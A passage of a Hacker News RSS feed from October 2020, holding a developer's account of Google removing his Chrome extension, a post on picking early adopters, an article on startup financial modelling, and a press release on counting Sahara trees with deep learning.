              <a href="https://safari-extensions.apple.com/details/?id=com.graffino.cleaner-for-facebook-86755BRK69" target="_blank">“Cleaner Facebook” Safari extension”</a>, got promptly solved by Apple in under three days.
            </p> <p>
              Google has a record of very bad user support. Basically, if your
              issue is not listed in the “Support Forums” you’re screwed. If I
              would have based my business on the Chrome Web store, I would be
              out of business by now.
            </p>  <h2>Update 8.09.2016</h2> <p>
              I never imagined this would generate this amount of attention:
              featured by
              <strong>Medium, 100k+</strong> views, heated discussions on
              <a href="https://www.reddit.com/r/programming/comments/51mgix/how_google_obliterated_my_4_year_old_chrome/" target="_blank">Reddit</a>
              or
              <a href="https://news.ycombinator.com/item?id=12442048" target="_blank">Hackernews</a>. I don’t really expect this to change anything for me, but I’m
              glad people are speaking up. If Google would implement a paid
              support option like Apple does for its developers, I’m sure a
              lot of pain would be avoided.
            </p> <p>
              I try to read everything, but I don’t respond on Medium (hate
              the commenting system), but you can ping me on Twitter.
            </p> <h2>To answer the most common questions:</h2> <p>1.<em> “Why don’t you change the name completely?”</em></p> <p>
              Well, because using “for Facebook” in the name is considered
              <a href="http://www.inta.org/TrademarkBasics/FactSheets/Pages/FairUse.aspx" target="_blank">fair use</a>. Also, when managing an app or extension with that many users,
              you don’t really want to confuse the users by renaming it to a
              completely different thing over night. It’s also an extension
              that only works on Facebook. I might also be infringing with the
              icon.
            </p> <p>
              So, you see, I really need guidelines to do this. Again, my
              problem is with the way this was handled, not the takedown
              itself.
            </p> <p>
              2.
              <em>“The extension was taken down because it was blocking ads.”
              </em></p> <p>
              This is simply untrue. I don't believe I was intentionally
              targeted. I was simply unlucky enough to be targeted by
              automated tools. Even the way my requests were handled weren’t
              done with malicious intent by Google. I think I’m just an edge
              case for which their support tools aren’t equipped to deal with.
            </p> <h2>Update: 9.09.2016</h2> <p>
              I received an email from Google today in which they’re
              expressing their apologies about the incident. It seems that
              they cannot do anything for the current store entry until the
              original complainant retracts his complain.
            </p> <figure><img src="https://by.graffino.com/_nuxt/img/3e2eaf4.png" alt="Google's first email response to Graffino's complaint."> <figcaption>Final email from my side.</figcaption></figure> <p>
              They offered me clear options though. We’re currently assessing
              what the best option might be. As I said in the article, this
              wasn’t an intentional targeting but a slip-up of their support
              which they’re trying to fix.
            </p> <p>
              Hopefully I will have the time to write a follow-up once all
              this is over. I didn’t expect or wanted this kind of attention,
              these have been 2 stressful days for me, trying to keep up with
              all the requests and messages, as I do have a job and my own
              company to run.
            </p> <p>
              It also happens that today is my birthday. I guess receiving a
              response from Google was my birthday present :).
            </p>  <h2>Update: 10.09.2016</h2> <p>
              You can still find the
              <a href="http://apps.graffino.com/" target="_blank">ad blocker extension</a>
              here. However, you will not be able to run it. Chrome made
              changes so that extensions cannot be side-loaded without an
              enterprise profile.
            </p> <h2>Final Update: 12.09.2016</h2> <p>
         …</p></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18">https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18</a></em></p>]]>
            </description>
            <link>https://by.graffino.com/how-google-obliterated-my-24k-users-chrome-extension-eeb14c040a39#.13m3awp18</link>
            <guid isPermaLink="false">hacker-news-small-sites-24855582</guid>
            <pubDate>Thu, 22 Oct 2020 07:10:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The virtual device farm for rendering websites on multiple devices]]>
            </title>
            <description>
<![CDATA[
Score 102 | Comments 27 (<a href="https://news.ycombinator.com/item?id=24855342">thread link</a>) | @seleniumbase
<br/>
October 21, 2020 | https://seleniumbase.io/devices/?url=news.ycombinator.com | <a href="https://web.archive.org/web/*/https://seleniumbase.io/devices/?url=news.ycombinator.com">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://seleniumbase.io/devices/?url=news.ycombinator.com</link>
            <guid isPermaLink="false">hacker-news-small-sites-24855342</guid>
            <pubDate>Thu, 22 Oct 2020 06:06:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Early Adopters: Be Picky About Who You Serve]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24854108">thread link</a>) | @johnkoht
<br/>
October 21, 2020 | https://www.johnkoht.com/blog/early-adopters-be-picky-about-who-you-serve | <a href="https://web.archive.org/web/*/https://www.johnkoht.com/blog/early-adopters-be-picky-about-who-you-serve">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/Article"><header><p>October 08, 2020</p></header><section itemprop="articleBody"><p>Any successful founder will tell you that team, product, and market are the most critical factors to building a successful business. And you’ll probably hear many of them talk about being “customer-obsessed” or “customer first.” But one of the most underrated factors in their success is not just the customers but also the quality of their early adopters.</p>
<p>While we can all agree that early adopters are good, they are not all created equal. The wrong users can derail entrepreneurs, causing them to lose focus and solve the wrong problems. Like a bad team or poor product, the wrong early adopters can push a company towards failure.</p>
<p>You should be picky about who you serve, especially during the initial phase of your product development process. Finding early adopters should be an investment similar to hiring a team. Entrepreneurs should recruit, interview, qualify, and partner with early adopters that will help them become most successful. It’s not a simple process and shouldn’t be taken for granted.</p>
<p>So how do you find the right early adopters? That’s a difficult question to answer. It’s all going to come down to your market, product, and judgment. But here are some characteristics that you should look for.</p>
<h2>They are in real pain.</h2>
<p>The right early users are deeply affected by the problem that you’re solving. They know the problem exists and are hungry for a better solution. They’ve probably tried other solutions and yearn for something better.</p>
<p>Early adopters will be keenly aware of the problem. They will explain the problem in various ways and how it affects their ability to work, live, or perform some activity. They’ve probably even tried to solve it somehow, maybe using Excel, some no-code app, a third-party tool, or a manual process.</p>
<h2>Their problem is very specific.</h2>
<p>Users have all kinds of problems. Most of which you’ll never solve. Others might be in your roadmap but are not core today. It’s essential to focus on users with the specific problem that you are solving for. Problems can emerge from various systems, workflows, and integrations that have nothing to do with the core problem or your potential solution. Eliminate the users who are looking to solve all of their problems. Eliminate the users who want a different, possibly related, problem solved.</p>
<p>The best early adopters need to solve a specific problem. It’s vital to ensure that it matches your vision and product solution.</p>
<h2>They are excited to help you.</h2>
<p>The solution you’re offering them is going to alleviate a pain point, and the best early adopters are more than excited to help you help them. The more excited they are, the more pain they experience from the problem.</p>
<p>Early adopters are partners. They should be excited about working with you, helping you solve their problem, and providing feedback. They should also be excited that they will be using your solution before others and developing a competitive edge as well.</p>
<p>When you acquire great early adopters, they will be the ones sending you feedback often and with excitement. They’ll be proud to help you craft your solution and feel like their part of the team.</p>
<h2>They are empowered</h2>
<p>Early adopters must be empowered to make decisions quickly. Working with your dream enterprise customer sounds great, but if they can’t get approval, move quickly, or activate your solution, you’ll be at the mercy of their bureaucracy.</p>
<p>Working with early adopters is a partnership, not a transaction. It’s important that early adopters can take your prototype, beta, or product and implement it within their team or organization.</p>
<p>The person is as vital as the company. Are they authorized to make the right decisions? Can they dedicate the time and resources to the problem and solution? Are they empowered to help you create the right solution? If they can’t meet these criteria, you should find another early adopter who can.</p>
<h2>They have a high-risk tolerance.</h2>
<p>The best products are built with customers, through an iterative process of trial and error. Early adopters who experience the pain are not enough; you need a partner who can tolerate the risks involved in the product development process. Not only do they have a high-risk tolerance, but they should also be willing and able to engage in ongoing experiments throughout the process.</p>
<p>Experimentation is critical to the process. You need to ensure that you partner with a customer that recognizes the process is about learning and improvement, not a finished product.</p>
<p>When interviewing customers, you should be upfront about this process and ensure they are comfortable with it. It’s okay if a potential customer can’t commit to the process, you can keep in touch and invite them to the product when it’s a bit more developed.</p>
<h2>Hire early adopters, don’t settle.</h2>
<p>Don’t just settle for the first few customers that show interest in your product. Spend time doing market mapping to better understand the market, sectors, and potential customers. Learn more about the companies and find who the best possible contacts would be. Reach out and conduct interviews to learn more about their organization, how the problem affects them, and their goals regarding the problem and solution. Make sure to dig in and ask tough questions to assess their risk-tolerance, current solutions, and whether they are authorized to make the necessary decisions.</p>
<p>If a potential customer seems like the problem isn’t that big of a deal, you should move on. If they can’t focus on just the one problem, move on. If they aren’t authorized to make decisions, ask about their manager and see if you can work your way up.</p>
<p>You should spend a good amount of time learning about each of these customers and selecting the best candidates. Don’t hesitate to reach out multiple times and have conversations with them to build confidence in your decisions. These will be partners as you experiment and craft your solution, so ensure you find the best possible partners.</p>
<h2>They’re all leads, too.</h2>
<p>Choosing the best early adopters doesn’t mean that the others will not be good future customers. All of these customers are now leads. Some might be great customers once you hit a particular milestone and finish more features; others might be customers down the road. Keep in touch and share updates on the product and feature set.</p>
<p>Recruiting high-quality early adopters is difficult but vital to the success of a company. Spend the time upfront to say no to customers that don’t fit your current vision and mission. While the process is difficult and costly, it’ll be worth the investment as the product matures.</p></section></article></div>]]>
            </description>
            <link>https://www.johnkoht.com/blog/early-adopters-be-picky-about-who-you-serve</link>
            <guid isPermaLink="false">hacker-news-small-sites-24854108</guid>
            <pubDate>Thu, 22 Oct 2020 01:37:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Startup Financial Modeling: What is a Financial Model? (2016)]]>
            </title>
            <description>
<![CDATA[
Score 228 | Comments 49 (<a href="https://news.ycombinator.com/item?id=24853787">thread link</a>) | @aaronbski
<br/>
October 21, 2020 | https://www.mathventurepartners.com/blog/2016/9/15/startup-financial-modeling-part-1-what-is-a-financial-model | <a href="https://web.archive.org/web/*/https://www.mathventurepartners.com/blog/2016/9/15/startup-financial-modeling-part-1-what-is-a-financial-model">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
  <article id="article-57daf9aad2b857a2108683be" data-item-id="57daf9aad2b857a2108683be">

    

    <div>
      
        <div data-layout-label="Post Body" data-type="item" data-updated-on="1473969767493" id="item-57daf9aad2b857a2108683be"><div><div><div data-block-type="2" id="block-7c825fcce3d916c3aa66"><div><p><em>This article was originally published over on Startup Rocket&nbsp;</em><a href="https://www.startuprocket.com/articles/startup-financial-modeling-part-1-what-is-a-financial-model" target="_blank"><em>here</em></a><em>, and written by Will Little and Troy Henikoff.</em></p><p><em>This series is the result of a friendly debate I had recently with&nbsp;</em><a href="https://www.mathventurepartners.com/troy-henikoff" target="_blank">Troy Henikoff</a><em>&nbsp;(former Techstars Chicago Accelerator Managing Director)&nbsp;regarding the best approach for founders to take when building a financial model. More accurately, the “debate” was a strong adverse reaction from Troy after I shared a template I built for Prota Ventures’ portfolio companies. His feedback was, essentially, to never use a template and instead build each model from scratch.</em></p><p><em>He invited me to a 90-minute lecture he gave where he overwhelmingly convinced me and the room that, indeed, founders need to take the time necessary to build their models from scratch. After I asked him where I could find his lecture material online, he suggested we co-author this article series since there weren’t many solid resources available. We sincerely hope you find this series helpful.&nbsp;</em></p><p>Our plan is to break this out into a four-part series and guide you through the components necessary for building your own financial model from scratch:</p><ul data-rte-list="default"><li><p><a href="https://www.mathventurepartners.com/blog/2016/9/15/startup-financial-modeling-part-1-what-is-a-financial-model" target="_blank">Part 1: The Why and What of Financial Modeling</a></p></li><li><p><a href="https://www.mathventurepartners.com/blog/2016/10/2/startup-financial-modeling-part-2-start-with-your-assumptions" target="_blank">Part 2: Assumptions</a></p></li><li><p><a href="https://www.mathventurepartners.com/blog/2016/10/2/startup-financial-modeling-part-3-the-income-statement-and-custom-detail-tabs" target="_blank">Part 3: Income Statement and Custom Detail Tabs</a></p></li><li><p><a href="https://www.mathventurepartners.com/blog/2016/10/7/startup-financial-modeling-part-4-the-balance-sheet-cash-flow-and-unit-economics" target="_blank">Part 4: Cash Flow, Balance Sheet and Keeping the Model Updated</a></p></li></ul><p>In short, a financial model is an abstract mathematical representation of how a company works (and more importantly, how it will work going forward). The model has inputs and outputs. The inputs are the assumptions that drive the model, things like what drives your customer acquisition cost, what your churn rates are, how much you pay people, etc. The outputs are a set of projections that show how the company will perform if the assumptions are true. One model can produce multiple sets of projections given different assumptions.</p><p>Based on a set of assumptions, a financial model is used to make smart decisions (e.g. how many sales people to hire and what to pay them). The model includes financial projections that are tied mathematically to the assumptions, which allows operators to “play with the variables” in order to understand how certain decisions might affect the future health of their company.</p><p><strong>Troy has an important story to share on this topic:</strong></p><p>“When fundraising for SurePayroll, we had some very high level financials in the pitch deck. Inevitably, VC’s would ask where the numbers came from. I would tell them that we had a very detailed financial model that drove it, I was setting the bait…</p><p>They would ask to be sent a copy of the model and I would refuse. I would only share it by first sitting down with them and an associate and reviewing the model in person and after that 90 minute session, I would leave them a copy of the model to play with further.</p><blockquote><p>They would insist that they could figure it out without the meeting, but I ALWAYS held my ground. I wanted the meeting not just to save them time and frustration learning a new model, but more importantly to get more face time with them in a situation where I was going to shine.</p></blockquote><p>I knew the model inside and out since I built it; I could answer any question about any cell and look like a genius. In the end, I did eight&nbsp;of these meetings and EVERY ONE of the firms that did the 90 minute meeting with me on the financial model either made an investment in the company or made an offer to invest in the company.&nbsp;<strong>Every single one</strong>.”</p><p>While it’s easy to search around and find a template to use, those templates were built by someone with a particular business in mind. Since every business is unique, this will lead you into trouble.</p><p>While it’s often helpful to&nbsp;<em>learn&nbsp;</em>from other people’s models to ensure, for example, that you aren’t missing anything important, you should never build your model using their template. You’ll end up banging your head against a wall when you need to change things, and you’ll inevitably be confused about some nuance that will come back to haunt you since you don’t understand it.</p><blockquote><p>In other words, while you may think that a template will help you save time, what you are actually doing is acquiring “technical debt” that will end up costing you more time in the long run.</p></blockquote><p>Plus, it’s critical to understand every column, row, cell and tab in your spreadsheet for two key reasons; it will help you better manage your business, and when the time comes to explain it to an investor, you’ll be able to explain exactly how it works and increase your odds of landing funding.</p><p>Since most people are using the financial model to communicate projections to investors, it is critical that you speak the investors’ language. They are used to having financials in Excel, so you should build your model in Excel.</p><blockquote><p>Google sheets is convenient for making changes and having multiple people editing, but sending an investor a model in Google sheets signals that you are not financially savvy.</p></blockquote><p>Investors are also used to seeing three standard statements; an income statement, a balance sheet, and a statement of cash flow. &nbsp;Each of these is more credible if it has BOTH the past performance and the future projections in the same spreadsheet.</p><p>Your spreadsheet should contain a tab for each of these outputs along with an “assumptions” tab and custom detail tabs needed to help calculate the main outputs. We’ll walk through a specific example later in this series so you have a better understanding of what this should look like.</p><p>Because of various accounting nuances – such as fixed asset depreciation and deferring revenue – if you assign ten accountants to finish your books at the end of the year, you’ll get ten different answers for how much profit (or loss) you had in the year. While hopefully not far off from the others, each will have a slightly different report of your “profit” based on their accounting opinions.</p><blockquote><p>However, the balance of your bank account is a specific number to point at; it’s a fact that your ten accountants should agree on.</p></blockquote><p>Therefore, it’s important to remember that your financial model will have your own opinions baked in regarding your profit. This means that examining your cash flow carefully as you fine-tune your business assumptions is critical.</p><p>Having a solid financial model is a significant step in communicating to investors that you are a logical thinker with a defensible plan and clearly understand your business and the levers that drive it. &nbsp;&nbsp;</p><p>Nobody expects your model to be perfect, as a matter of fact, when we present a model, we always open with the same line:</p><blockquote><p><em>“The only thing we know for sure about this model is that it is wrong. But, if we look critically at it we can better understand the drivers of the business and what we need to be focused on to reduce our risk.” &nbsp;</em></p></blockquote><p>Keep in mind, investors are looking for the big home runs, but they are also looking at reducing their risk. The model can help them get comfortable with the risk.</p><p>– – –</p><p><em>In our next post in this series, we’ll dive in a step-by-step guide of how to build a financial model, starting with the assumptions tab.&nbsp;</em><a href="https://satchel.works/@wclittle/subscribe" target="_blank">Subscribe</a><em>&nbsp;to Will’s newsletter to get notified when the next articles are up. As we mentioned above, feel free to ping us on Twitter (</em><a href="https://twitter.com/wclittle" target="_blank"><em>@wclittle</em></a><em>,&nbsp;</em><a href="https://twitter.com/troyhenikoff" target="_blank"><em>@troyhenikoff</em></a><em>) with any questions.</em></p></div></div></div></div></div>
      
    </div>


    

    
      
    

    

  </article>

  

  

  
  
  

</div></div>]]>
            </description>
            <link>https://www.mathventurepartners.com/blog/2016/9/15/startup-financial-modeling-part-1-what-is-a-financial-model</link>
            <guid isPermaLink="false">hacker-news-small-sites-24853787</guid>
            <pubDate>Thu, 22 Oct 2020 00:28:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AI reveals hundreds of millions of trees in the Sahara]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24853679">thread link</a>) | @hhs
<br/>
October 21, 2020 | https://news.ku.dk/all_news/2020/10/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara | <a href="https://web.archive.org/web/*/https://news.ku.dk/all_news/2020/10/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-area">
        <div>
          <!-- Content with right menu -->

<div>
  
    





  

	<p>
		20 October 2020
	</p>

	


	<div>
		<p><span>TREES</span></p><p>There are far more trees in the West African Sahara and Sahel than most would expect. A combination of artificial intelligence and detailed satellite imagery allowed a team from the University of Copenhagen and international collaborators to count all trees across a 1.3 million km2 area of West Africa. 
</p>
	</div> 
		<figure>
			<img alt="Dryland landscape in Africa" src="https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/billedinformationer/Sahara_1100x600.jpg" title="Dryland landscape in Africa">
			<figcaption>Photo: Martin Brandt</figcaption>
		</figure>

	<p>If you think that the Sahara is covered only by golden dunes and scorched rocks, you aren’t alone. Perhaps it's time to shelve that notion. In an area of West Africa 30 times larger than Denmark, an international team, led by University of Copenhagen and NASA researchers, has counted over 1.8 billion trees and shrubs. The 1.3 million km<sup>2</sup> area covers the western-most portion of the Sahara Desert, the Sahel and what are known as sub-humid zones of West Africa.</p>
<p>"We were very surprised to see that quite a few trees actually grow in the Sahara Desert, because up until now, most people thought that virtually none existed. We counted hundreds of millions of trees in the desert alone. Doing so wouldn't have been possible without this technology. Indeed, I think it marks the beginning of a new scientific era," asserts Assistant Professor Martin Brandt of the University of Copenhagen’s Department of Geosciences and Natural Resource Management, lead author of <a href="https://www.nature.com/articles/s41586-020-2824-5">the study’s scientific article, now published in <em>Nature</em></a>.</p>
<p>The work was achieved through a combination of detailed satellite imagery provided by NASA, and deep learning — an advanced artificial intelligence method. Normal satellite imagery is unable to identify individual trees, they remain literally invisible. Moreover, &nbsp;a limited interest in counting trees outside of forested areas led to the prevailing view that there were almost no trees in this particular region. This is the first time that trees across a large dryland region have been counted.</p>
<h2>The role of trees in the global carbon budget</h2>
<p>New knowledge about trees in dryland areas like this is important for several reasons, according to Martin Brandt. For example, they represent an unknown factor when it comes to the global carbon budget:</p>
<p>"Trees outside of forested areas are usually not included in climate models, and we know very little about their carbon stocks. They are basically a white spot on maps and an unknown component in the global carbon cycle," explains Martin Brandt.</p>
<p>Furthermore, the new study can contribute to better understanding the importance of trees for biodiversity and ecosystems and for the people living in these areas. In particular, enhanced knowledge about trees is also important for developing programmes that promote agroforestry, which plays a major environmental and socio-economic role in arid regions.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>"Thus, we are also interested in using satellites to determine tree species, as tree types are significant in relation to their value to local populations who use wood resources as part of their livelihoods. Trees and their fruit are consumed by both livestock and humans, and when preserved in the fields, trees have a positive effect on crop yields because they improve the balance of water and nutrients," explains Professor Rasmus Fensholt of the Department of Geosciences and Natural Resource Management.</p>

<figure><img alt="The area where the trees were mapped" src="https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/billedinformationer/West_Africa_study_area_1100x600.jpg" title="The red rectangle marks the area where the trees were mapped">
<figcaption>The red rectangle marks the area where the trees were mapped.</figcaption>
</figure>

<h2>Technology with a high potential</h2>
<p>The research was conducted in collaboration with the University of Copenhagen’s Department of Computer Science, where researchers developed the deep learning algorithm that made the counting of trees over such a large area possible.</p>
<p>The researchers show the deep learning model what a tree looks like: They do so by feeding it thousands of images of various trees. Based upon the recognition of tree shapes, the model can then automatically identify and map trees over large areas and thousands of images. The model needs only hours what would take thousands of humans several years to achieve.</p>
<p>"This technology has enormous potential when it comes to documenting changes on a global scale and ultimately, in contributing towards global climate goals. It is a motivation for us to develop this type of beneficial artificial intelligence," says professor and co-author Christian Igel of the Department of Computer Science.</p>
<p>The next step is to expand the count to a much larger area in Africa. And in the longer term, the aim is to create a global database of all trees growing outside forest areas.</p>





  

</div>
<div>

  
    
    
        	

	


        <div>
    <p>
        <h2>Fakta</h2>
    </p>
    <div>
        <ul>
<li>The researchers counted 1.8 billion trees and shrubs with crowns larger than 3 m<sup>2</sup>. Thus, the actual number of trees in the area is even higher.</li>
<li>Deep learning can be characterized as an advanced artificial intelligence method where an algorithm is trained to recognize specific patterns in large amounts of data. The algorithm used in this research was trained using nearly 90,000 images of different trees across a variety of landscapes. </li>
<li><a href="https://www.nature.com/articles/s41586-020-2824-5">The scientific article for this study is published in the renowned journal Nature.</a> </li>
<li>The research was carried out by researchers from the University of Copenhagen; NASA Goddard Space Flight Center, USA; HCI Group, University of Bremen, Germany; Université Paul Sabatier, France; Pastoralisme Conseil, France; Centre de Suivi Ecologique, Senegal; Geosciences Environnement Toulouse (GET), France; Ecole Normale Supérieure, France; Université Catholique de Louvain, Belgium.</li>
<li>The research is supported, among others, The AXA Research Fund (postdoctoral programme); Independent Research Fund Denmark - Sapere Aude; Villum Foundation and the European Research Council (ERC) under the EU's Horizon 2020 Programme.</li>
</ul>

    </div>
</div>


        






  
</div>

        </div>
        
      </div></div>]]>
            </description>
            <link>https://news.ku.dk/all_news/2020/10/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara</link>
            <guid isPermaLink="false">hacker-news-small-sites-24853679</guid>
            <pubDate>Thu, 22 Oct 2020 00:07:31 GMT</pubDate>
        </item>
    </channel>
</rss>
